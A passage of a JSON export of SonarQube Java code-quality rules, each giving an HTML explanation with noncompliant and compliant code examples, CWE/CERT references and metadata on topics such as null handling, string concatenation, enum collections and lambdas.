issue.</p>\n<h2>Resources</h2>\n<ul>\n  <li> {rule:java:S4973} - Strings and Boxed types should be compared using \"equals()\" </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/595\">CWE-595 - Comparison of Object References Instead of Object Contents</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/597\">CWE-597 - Use of Wrong Operator in String Comparison</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UjdGBQ\">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed\n  primitives </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/yDdGBQ\">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1698","summary":"\"==\" and \"!=\" should not be used when \"equals\" is overridden","tags":["cwe","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>NullPointerException</code> should be avoided, not caught. Any situation in which <code>NullPointerException</code> is explicitly caught can\neasily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the \"is null\" branch of\nthe conditional.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n  try {\n    len += str.length();\n  }\n  catch (NullPointerException e) {\n    log.info(\"argument was null\");\n  }\n  return len;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n\n  if (str != null) {\n    len += str.length();\n  }\n  else {\n    log.info(\"argument was null\");\n  }\n  return len;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/395\">CWE-395 - Use of NullPointerException Catch to Detect NULL Pointer Dereference</a>\n  </li>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/ERR08-J.+Do+not+catch+NullPointerException+or+any+of+its+ancestors\">ERR08-J.\n  Do not catch NullPointerException or any of its ancestors</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"infeasible","ruleKey":"RSPEC-1696","summary":"\"NullPointerException\" should not be caught","tags":["cwe","error-handling","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates\nthat code is structured to avoid NPEâs.</p>\n<p>Explicitly throwing <code>NullPointerException</code> forces a methodâs callers to explicitly catch it, rather than coding to avoid it. Further, it\nmakes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely\nthrow an NPE.</p>\n<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation\ninstead.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doSomething (String aString) throws NullPointerException {\n     throw new NullPointerException();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void doSomething (@NotNull String aString) {\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1695","summary":"\"NullPointerException\" should not be explicitly thrown","tags":["error-handling","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>\n<p>A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a concrete class (i.e. remove the\n<code>abstract</code> keyword) with a private constructor.</p>\n<p>A class with only abstract methods and no inheritable behavior should be converted to an interface.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic abstract class Animal {  // Noncompliant; should be an interface\n  abstract void move();\n  abstract void feed();\n}\n\npublic abstract class Color {  // Noncompliant; should be concrete with a private constructor\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  public int getRed() {\n    return red;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic interface Animal {\n  void move();\n  void feed();\n}\n\npublic class Color {\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  private Color () {}\n\n  public int getRed() {\n    return red;\n  }\n}\n\npublic abstract class Lamp {\n\n  private boolean switchLamp=false;\n\n  public abstract void glow();\n\n  public void flipSwitch() {\n    switchLamp = !switchLamp;\n    if (switchLamp) {\n      glow();\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1694","summary":"An abstract class should have both abstract and concrete methods","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Declaring multiple variables on one line is difficult to read.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass MyClass {\n\n  private int a, b;\n\n  public void method(){\n    int c; int d;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass MyClass {\n\n  private int a;\n  private int b;\n\n  public void method(){\n    int c;\n    int d;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YTZGBQ\">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/EtcxBQ\">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1659","summary":"Multiple variables should not be declared on the same line","tags":["convention","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake\nand some other value or variable was intended for the assignment instead.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void setName(String name) {\n  name = name;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void setName(String name) {\n  this.name = name;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-1656","summary":"Variables should not be self-assigned","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Strings are immutable objects, so concatenation doesnât simply add the new String to the end of the existing string. Instead, in each loop\niteration, the first String is converted to an intermediate object type, the second string is appended, and then the intermediate object is converted\nback to a String. Further, performance of these intermediate operations degrades as the String gets longer. Therefore, the use of StringBuilder is\npreferred.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString str = \"\";\nfor (int i = 0; i &lt; arrayOfStrings.length ; ++i) {\n  str = str + arrayOfStrings[i];\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nStringBuilder bld = new StringBuilder();\n  for (int i = 0; i &lt; arrayOfStrings.length; ++i) {\n    bld.append(arrayOfStrings[i]);\n  }\n  String str = bld.toString();\n</pre>\n<h2>Resources</h2>\n<h3>Benchmarks</h3>\n<table>\n  <colgroup>\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Method</th>\n      <th>size</th>\n      <th>Runtime</th>\n      <th>Average time</th>\n      <th>Error margin</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>plus</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>4.19 Âµs/op</p></td>\n      <td><p>Â±0.34 Âµs/op</p></td>\n    </tr>\n    <tr>\n      <td><p>plus</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>377.08 Âµs/op</p></td>\n      <td><p>Â±17.36 Âµs/op</p></td>\n    </tr>\n    <tr>\n      <td><p>plus</p></td>\n      <td><p>10000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>40221.49 Âµs/op</p></td>\n      <td><p>Â±1342.76 Âµs/op</p></td>\n    </tr>\n    <tr>\n      <td><p>plus</p></td>\n      <td><p>100000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>5286840.53 Âµs/op</p></td>\n      <td><p>Â±185796.75 Âµs/op</p></td>\n    </tr>\n    <tr>\n      <td><p>stringBuilder</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>0.97 Âµs/op</p></td>\n      <td><p>Â±0.03 Âµs/op</p></td>\n    </tr>\n    <tr>\n      <td><p>stringBuilder</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>10.25 Âµs/op</p></td>\n      <td><p>Â±1.64 Âµs/op</p></td>\n    </tr>\n    <tr>\n      <td><p>stringBuilder</p></td>\n      <td><p>10000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>93.27 Âµs/op</p></td>\n      <td><p>Â±16.05 Âµs/op</p></td>\n    </tr>\n    <tr>\n      <td><p>stringBuilder</p></td>\n      <td><p>100000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>1019.91 Âµs/op</p></td>\n      <td><p>Â±69.58 Âµs/op</p></td>\n    </tr>\n  </tbody>\n</table>\n<p><strong>Benchmarking code</strong></p>\n<p>The results were generated by running the following snippet with <a href=\"https://github.com/openjdk/jmh\">JMH</a>.</p>\n<pre>\n@Param({\"100\", \"1000\", \"10000\", \"100000\"})\nint size;\nprivate String word = \"append\";\n\n@Benchmark\npublic String plus() {\n  String str = \"\";\n  for (int i = 0; i &lt; size; i++) {\n    str = str + word;\n  }\n  return str;\n}\n\n@Benchmark\npublic String stringBuilder() {\n  StringBuilder builder = new StringBuilder();\n  for (int i = 0; i &lt; size; i++) {\n    builder.append(word);\n  }\n  return builder.toString();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1643","summary":"Strings should not be concatenated using '+' in a loop","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When all the elements in a Set are values from the same enum, the Set can be replaced with an EnumSet, which can be much more efficient than other\nsets because the underlying data structure is a simple bitmap.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    Set&lt;COLOR&gt; warm = new HashSet&lt;COLOR&gt;();\n    warm.add(COLOR.RED);\n    warm.add(COLOR.ORANGE);\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    Set&lt;COLOR&gt; warm = EnumSet.of(COLOR.RED, COLOR.ORANGE);\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1641","summary":"Sets with elements that are enum values should be replaced with EnumSet","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>If all the keys in a <code>Map</code> are values from a single enum, it is recommended to use an <code>EnumMap</code> as the specific\nimplementation. An <code>EnumMap</code>, which has the advantage of knowing all possible keys in advance, is more efficient compared to other\nimplementations, as it can use a simple array as its underlying data structure.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic enum Color {\n  RED, GREEN, BLUE, ORANGE;\n}\n\nMap&lt;Color, String&gt; colorMap = new HashMap&lt;&gt;(); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic enum Color {\n  RED, GREEN, BLUE, ORANGE;\n}\n\nMap&lt;Color, String&gt; colorMap = new EnumMap&lt;&gt;(Color.class); // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-enum-map\">A Guide to EnumMap - Baeldung</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1640","summary":"Maps with keys that are enum values should use the EnumMap implementation","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Method or constructor references are more readable than lambda expressions in many situations, and may therefore be preferred.</p>\n<p>However, method references are sometimes less concise than lambdas. In such cases, it might be preferrable to keep the lambda expression for better\nreadability. Therefore, this rule only raises issues on lambda expressions where the replacement method reference is shorter.</p>\n<p>This rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>8</code>, as lambda expressions were\nintroduced in Java 8.</p>\n<h2>How to fix it</h2>\n<p>Refer to the called method by its reference instead of wrapping it in a lambda expression.</p>\n<p>For instance:</p>\n<ul>\n  <li> <code>null</code> checks can be replaced with references to <code>Objects::isNull</code> and <code>Objects::nonNull</code> </li>\n  <li> Casts can be replaced with <code>SomeClass.class::cast</code> </li>\n  <li> <code>instanceof</code> can be replaced with <code>SomeClass.class::isInstance</code> </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass A {\n  void process(List&lt;A&gt; list) {\n    list.stream()\n      .filter(myListValue -&gt; myListValue instanceof B)     // Noncompliant\n      .map(listValueToMap -&gt; (B) listValueToMap)           // Noncompliant\n      .map(bValueToMap -&gt; bValueToMap.&lt;String&gt;getObject()) // Noncompliant\n      .forEach(o -&gt; System.out.println(o));                // Noncompliant\n  }\n}\n\nclass B extends A {\n  &lt;T&gt; T getObject() {\n    return null;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass A {\n  void process(List&lt;A&gt; list) {\n    list.stream()\n      .filter(B.class::isInstance)   // Compliant\n      .map(B.class::cast)            // Compliant\n      .map(B::&lt;String&gt;getObject)     // Compliant\n      .forEach(System.out::println); // Compliant\n  }\n}\n\nclass B extends A {\n  &lt;T&gt; T getObject() {\n    return null;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/javaOO/methodreferences.html\">Method References - The Javaâ¢ Tutorials</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1612","summary":"Lambdas should be replaced with method references","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Lambda expressions with only one argument with an inferred type (i.e., no explicit type declaration) can be written without parentheses around that\nsingle parameter. This syntax is simpler, more compact and readable than using parentheses and is therefore preferred.</p>\n<p>This rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>8</code>, as lambda expressions were\nintroduced in Java 8.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n(x) -&gt; x * 2\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nx -&gt; x * 2\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1611","summary":"Parentheses should be removed from a single lambda parameter when its type is inferred","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p>With Java 8âs \"default method\" feature, any abstract class without direct or inherited field should be converted into an interface. However, this\nchange may not be appropriate in libraries or other applications where the class is intended to be used as an API.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic abstract class Car {\n  public abstract void start(Environment c);\n\n  public void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic interface Car {\n  public void start(Environment c);\n\n  public default void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1610","summary":"Abstract classes without fields should be converted to interfaces","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When a test fails due, for example, to infrastructure issues, you might want to ignore it temporarily. But without some kind of notation about why\nthe test is being ignored, it may never be reactivated. Such tests are difficult to address without comprehensive knowledge of the project, and end up\npolluting their projects.</p>\n<p>This rule raises an issue for each ignored test that does not have any comment about why it is being skipped.</p>\n<ul>\n  <li> For Junit4, this rule targets the @Ignore annotation. </li>\n  <li> For Junit5, this rule targets the @Disabled annotation. </li>\n  <li> Cases where assumeTrue(false) or assumeFalse(true) are used to skip tests are targeted as well. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\n@Ignore  // Noncompliant\n@Test\npublic void testDoTheThing() {\n  // ...\n</pre>\n<p>or</p>\n<pre>\n@Test\npublic void testDoTheThing() {\n  Assume.assumeFalse(true); // Noncompliant\n  // ...\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Test\n@Ignore(\"See Ticket #1234\")\npublic void testDoTheThing() {\n  // ...\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1607","summary":"JUnit4 @Ignored and JUnit5 @Disabled annotations should be used to disable tests and should provide a rationale","tags":["junit","tests","bad-practice","confusing","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Before Java 8, the only way to partially support closures in Java was by using anonymous inner classes. Java 8 introduced lambdas, which are\nsignificantly more readable and should be used instead.</p>\n<p>This rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>8</code>, as lambda expressions were\nintroduced in Java 8.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nmyCollection.stream().map(new Function&lt;String,String&gt;() { // Noncompliant, use a lambda expression instead\n  @Override\n  public String apply(String input) {\n    return new StringBuilder(input).reverse().toString();\n  }\n})\n  ...\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nmyCollection.stream()\n  .map(input -&gt; new StringBuilder(input).reverse().toString()) // Compliant\n    ...\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nPredicate&lt;String&gt; isEmpty = new Predicate&lt;String&gt;() { // Noncompliant, use a lambda expression instead\n  @Override\n  public boolean test(String myString) {\n    return myString.isEmpty();\n  }\n};\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nPredicate&lt;String&gt; isEmpty = myString -&gt; myString.isEmpty(); // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/javaOO/lambdaexpressions.html\">Lambda Expressions - The Javaâ¢ Tutorials</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1604","summary":"Anonymous inner classes containing only one method should become lambdas","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>This rule raises an issue when a lambda expression uses block notation while expression notation could be used.</p>\n<h2>Why is this an issue?</h2>\n<p>The right-hand side of a lambda expression can be written in two ways:</p>\n<ol>\n  <li> Expression notation: the right-hand side is as an expression, such as in <code>(a, b) â a + b</code> </li>\n  <li> Block notation: the right-hand side is a conventional function body with a code block and an optional return statement, such as in <code>(a, b)\n  â {return a + b;}</code> </li>\n</ol>\n<p>By convention, expression notation is preferred over block notation. Block notation must be used when the function implementation requires more\nthan one statement. However, when the code block consists of only one statement (which may or may not be a <code>return</code> statement), it can be\nrewritten using expression notation.</p>\n<p>This convention exists because expression notation has a cleaner, more concise, functional programming style and is regarded as more readable.</p>\n<h2>How to fix it</h2>\n<ul>\n  <li> If the code block consists only of a <code>return</code> statement, replace the code block with the argument expression from the\n  <code>return</code> statement. </li>\n  <li> If the code block consists of a single statement that is not a <code>return</code> statement, replace the code block with that statement. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n(a, b) -&gt; { return a + b; } // Noncompliant, replace code block with expression\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n(a, b) -&gt; a + b             // Compliant\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nx -&gt; {System.out.println(x+1);} // Noncompliant, replace code block with statement\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nx -&gt; System.out.println(x+1)    // Compliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1602","summary":"Lambdas containing only one statement should not nest this statement in a block","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The purpose of Java packages is to give structure to your project. A structure helps to mentally break down a project into smaller parts,\nsimplifying readers' understanding of how components are connected and how they interact.</p>\n<p>By convention, the source files' directory structure should replicate the projectâs package structure. This is for the following reasons:</p>\n<ol>\n  <li> The mapping between the package name and the location of the source file of a class is straightforward. That is, the path to the source file is\n  easier to find for a given fully qualified class name. </li>\n  <li> If two different structures are applied to the same project - one to the packages but another to the source file directories - this confuses\n  developers while not providing any benefit. </li>\n  <li> The directory structure of the class files generated by the compiler will match the package structure, no matter the source fileâs directory.\n  It would not make sense to have one directory structure for the generated class files but a different one for the associated source files. </li>\n</ol>\n<p>Similarly, a source directory should not have the character <code>.</code> in its name, as this would make it impossible to match the directory to\nthe package structure.</p>\n<h2>How to fix it</h2>\n<p>Either move the source file so that the relative file path within the source directory matches the package name, or change the package name so that\nit matches the relative file path.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n// file: src/main/foo/Fubar.java\npackage com.foo.bar;\n\nclass Fubar {\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n// file: src/main/com/foo/bar/Fubar.java\npackage com.foo.bar;\n\nclass Fubar {\n}\n</pre>\n<pre>\n// file: src/main/foo/Fubar.java\npackage foo;\n\nclass Fubar {\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-declared-expected-package-error\">Baeldung - Fixing the \"Declared package does not match the expected\n  package\" Error</a> </li>\n  <li> <a href=\"https://www.baeldung.com/java-file-vs-file-path-separator\">Stackoverflow - Why do java source files require package declarations?</a>\n  </li>\n  <li> <a\n  href=\"https://www.tutorialspoint.com/what-are-the-best-practices-to-keep-in-mind-while-using-packages-in-java#:~:text=Naming%20conventions%20and%20best%20practices%20for%20packages\">tutorialspoint - What are the best practices to keep in mind while using packages in Java?</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1598","summary":"Package declaration should match source file directory","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>This rule raises an issue when the <code>Collections.EMPTY_*</code> fields are used instead of the <code>Collections.empty*()</code> methods.</p>\n<h2>Why is this an issue?</h2>\n<p>Generic types (types with type parameters) have been introduced into Java with language version 1.5. If type parameters are specified for a class\nor method, it is still possible to ignore them to keep backward compatibility with older code, which is called the <em>raw type</em> of the class or\ninterface.</p>\n<p>Using raw type expressions is highly discouraged because the compiler cannot perform static type checking on them. This means that the compiler\nwill not report typing errors about them at compile time, but a <code>ClassCastException</code> will be thrown during runtime.</p>\n<p>In Java 1.5, generics were also added to the Java collections API, and the data structures in <code>java.util</code>, such as <code>List</code>,\n<code>Set</code>, or <code>Map</code>, now feature type parameters. <code>Collections.EMPTY_LIST</code>, <code>Collections.EMPTY_SET</code>, and\n<code>Collections.EMPTY_MAP</code> are relics from before generics, and they return raw lists, sets, or maps, with the limitations mentioned\nabove.</p>\n<h2>How to fix it</h2>\n<p>Use:</p>\n<ul>\n  <li> <code>Collections.emptyList()</code> instead of <code>Collections.EMPTY_LIST</code> </li>\n  <li> <code>Collections.emptySet()</code> instead of <code>Collections.EMPTY_SET</code> </li>\n  <li> <code>Collections.emptyMap()</code> instead of <code>Collections.EMPTY_MAP</code> </li>\n</ul>\n<p>In addition, there are variants of <code>Collections.empty*()</code> available also for other collection interfaces, such as\n<code>Collections.emptyIterator()</code>, <code>Collections.emptyNavigableMap()</code>, <code>Collections.emptySortedSet()</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nList&lt;String&gt; collection1 = Collections.EMPTY_LIST;     // Noncompliant, raw List\nSet&lt;Float&gt; collection2 = Collections.EMPTY_SET;        // Noncompliant, raw Set\nMap&lt;Int, String&gt; collection3 = Collections.EMPTY_MAP;  // Noncompliant, raw Map\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nList&lt;String&gt; collection1 = Collections.emptyList();    // Compliant, List&lt;String&gt;\nSet&lt;Float&gt; collection2 = Collections.emptySet();       // Compliant, Set&lt;Float&gt;\nMap&lt;Int, String&gt; collection3 = Collections.emptyMap(); // Compliant, Map&lt;Int, String&gt;\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html\">Oracle - Javaâ¢ Platform, Standard Edition 8 API Specification,\n  Class 